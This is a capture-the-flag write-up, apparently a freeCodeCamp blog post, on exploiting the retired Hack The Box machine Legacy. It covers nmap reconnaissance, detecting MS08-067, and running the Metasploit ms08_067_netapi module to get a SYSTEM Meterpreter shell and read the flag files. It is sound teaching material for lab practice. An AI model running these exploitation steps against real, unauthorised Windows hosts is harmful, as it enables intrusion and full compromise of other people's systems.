---
title: Keep Calm and Hack The Box - Legacy
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2019-08-05T06:29:04.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-legacy
coverImage: https://www.freecodecamp.org/news/content/images/2019/08/126410.jpg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: hacking
  slug: hacking
- name: Security
  slug: security
seo_title: null
seo_desc: Hack The Box (HTB) is an online platform allowing you to test your penetration
  testing skills. It contains several challenges that are constantly updated. Some
  of them simulating real world scenarios and some of them leaning more towards a
  CTF style ...
---

Hack The Box (HTB) is an online platform allowing you to test your penetration testing skills. It contains several challenges that are constantly updated. Some of them simulating real world scenarios and some of them leaning more towards a CTF style of challenge.

**Note**. _Only write-ups of retired HTB machines are allowed._

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-16.55.11.png)

Legacy is the second machine published on Hack The Box and is for beginners, requiring only one exploit to obtain root access.

We will use the following tools to pawn the box on a [Kali Linux box](https://www.kali.org/)

* [nmap](https://nmap.org/)
* [zenmap](https://nmap.org/zenmap/)
* [searchsploit](https://www.exploit-db.com/searchsploit)
* [metasploit](https://www.metasploit.com/)

## **Step 1 - Scanning the network**

The first step before exploiting a machine is to do a little bit of scanning and reconnaissance.

This is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on that phase to get as much information as you could.

I will use Nmap (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.

There are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation [here](https://tools.kali.org/information-gathering/nmap)

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-17.01.22.png)

I use the following command to get a basic idea of what we are scanning

```bash
nmap -sV -O -F --version-light 10.10.10.4
```

**-sV:** Probe open ports to determine service/version info

**-O:** Enable OS detection

**-F:** Fast mode - Scan fewer ports than the default scan

**--version-light:** Limit to most likely probes (intensity 2)

**10.10.10.**4**:** IP address of the Legacy box

You can also use Zenmap, which is the official Nmap Security Scanner GUI. It is a multi-platform, free and open source application which aims to make Nmap easy for beginners to use while providing advanced features for experienced Nmap users.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-17.40.09.png)

I use almost the same set of commands to perform a quick scan plus. The only difference is the addition of the flag -T4

```bash
nmap -sV -T4 -O -F --version-light 10.10.10.4
```

**-**T4**:** Faster execution

If you find the results a little bit too overwhelming, you can move to the **Ports/Hosts** tab to only get the open ports

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-17.40.29.png)

We can see that there are 2 open ports:

**Port 139**. NetBIOS Session Service

**Port 445**. Microsoft-DS (Directory Services) SMB file sharing

Let's do some research to see what we can find.

## **Step 2 - Understanding e**xploitable vulnerability MS08-067

Still on Zenmap, we look for any known vulnerabilities

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-18.02.52.png)

I use the following command

```bash
nmap -p 445 --script vuln 10.10.10.4
```

**-**p**:** Set destination port(s)

**445**:**** The open port we've discovered earlier

**-**-script vuln**:** Check for specific known vulnerabilities and generally only report results if they are found

**10.10.10.**4**:** IP address of the Legacy box

We can see that there is a vulnerability, **smb-vuln-ms08-067**, where Microsoft Windows system is vulnerable to remote code execution.

This is the [CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250) for **MS08-067**.

Let's first understand how patching works in Microsoft and where this naming convention is coming from.

This is an excerpt from [rapid7 blog](https://blog.rapid7.com/2014/02/03/new-ms08-067/)

> In November of 2003 Microsoft standardized its patch release cycle. By releasing its patches on the second Tuesday of every month Microsoft hoped to address issues that were the result of patches being release in a non uniform fashion. This effort has become known as Patch-Tuesday. From the implementation of Patch-Tuesday (November, 2003) until December, 2008 Microsoft released a total of 10 patches that were not release on a Patch-Tuesday also known as “out-of-band” patches. The 10th out-of-band patch released by Microsoft is outlined in the [MS08-067](http://technet.microsoft.com/en-us/security/bulletin/ms08-067) security bulletin



![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screen-Shot-2014-01-30-at-11.25.35-AM.png)
_[https://blog.rapid7.com/2014/02/03/new-ms08-067/](https://blog.rapid7.com/2014/02/03/new-ms08-067/)_

Let's also have a look at [Microsoft Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067) on MS08-067

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-18.19.32.png)
_[https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067)_

Now that we have a little bit more information on that vulnerability, let's try to exploit it!

## **Step 3 - Exploiting** MS08-067

We use Searchsploit, a command line search tool for Exploit Database, to check if there's a Metasploit exploit available for us to use

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-18.24.39.png)

I use the following command

```bash
searchsploit ms08-067
```

I launch Metasploit and look for the command I should use to launch the exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-18.34.54.png)

I use the command to look for all the payloads available for ms08-067

```bash
search ms08_067
```

We find the payload to exploit the vulnerability

```bash
exploit/windows/smb/ms08_067_netapi
```

ms08_067_netapi is one of the most popular remote exploits against Microsoft Windows. It is considered a reliable exploit and allows you to gain access as SYSTEM which is the highest Windows privilege.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-18.40.33-1.png)

I use the following command for the exploit

```bash
use exploit/windows/smb/ms08_067_netapi
```

This will launch the exploit. I use this command to display the available options

```bash
show options
```

You can see that the remote host (RHOSTS) is not yet set. I will set  the remote host as this piece of information is needed to run the exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-18.43.05.png)

I use the following command to set the remote host using the IP address of HTB Legacy box

```bash
set RHOSTS 10.10.10.4
```

You can also do a check before running the exploit and confirm that the target is vulnerable

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-18.44.30.png)

I use the following command to do the check

```bash
check
```

We can now run the exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-18.46.56.png)

Bingo! We have a Meterpreter session. Let's see what we can find :)

## **Step 4 - Using Meterpreter to find the user.txt flag**

From the Offensive Security website, we get this definition for Meterpreter

> Meterpreter is an advanced, dynamically extensible payload that uses _in-memory_ DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.

You can read more about Meterpreter [here](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/), and get to know more commands for this tool [here](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)

Let's find the user.txt flag

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-18.56.52.png)

I use the following command to search for the file

```bash
search -f user.txt
```

**-**f**:** File name

The **search** commands provides a way of locating specific files on the target host. The command is capable of searching through the whole system or specific folders.

We now need to navigate to 

```bash
c:\Documents and Settings\john\Desktop\user.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-19.06.24.png)

To check where you are, you can use the following command

```bash
pwd
```

I am currently at

```bash
C:\WINDOWS\system32
```

I use the following command twice to move to the parent directory

```bash
cd ..
```

I use the following command to list all the files/folders when I'm at **C:\** level

```bash
ls
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-19.11.06.png)

I then move to the folder where the user.txt flag is. I use **ls** to list all files under the **Desktop** folder

We found the **user.txt** file! To read the content of the file I use the command

```bash
cat user.txt
```

Now that we have the user flag, let's find the root flag!

## **Step 5 - Looking for the root.txt flag**

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-19.16.04.png)

I use the following command to search for the file

```bash
search -f root.txt
```

We now need to navigate to 

```bash
c:\Documents and Settings\Administrator\Desktop\root.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-04-at-19.16.41.png)

Going back to **C:\** to navigate to the **Administrator** folder then the **Desktop** folder. I use **ls** to list all files under the **Desktop** folder

We find the **root.txt** file! 

To read the content of the file I use the command

```bash
cat root.txt
```

Congrats! You found both flags!

---

Please don’t hesitate to comment, ask questions or share with your friends :)

You can see more of my articles [here](https://www.freecodecamp.org/news/author/sonya/)

You can follow me on [Twitter](https://twitter.com/SonyaMoisset) or on [LinkedIn](https://www.linkedin.com/in/sonyamoisset/)

And don't forget to #**GetSecure**, #**BeSecure** & #**StaySecure**!

---

**Other articles in this series**

* [Keep Calm and Hack The Box - Lame](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
* [Keep Calm and Hack The Box - Devel](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-devel/)
* [Keep Calm and Hack The Box - Beep](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)

![Image](https://www.freecodecamp.org/news/content/images/2019/08/126410-3.jpg)

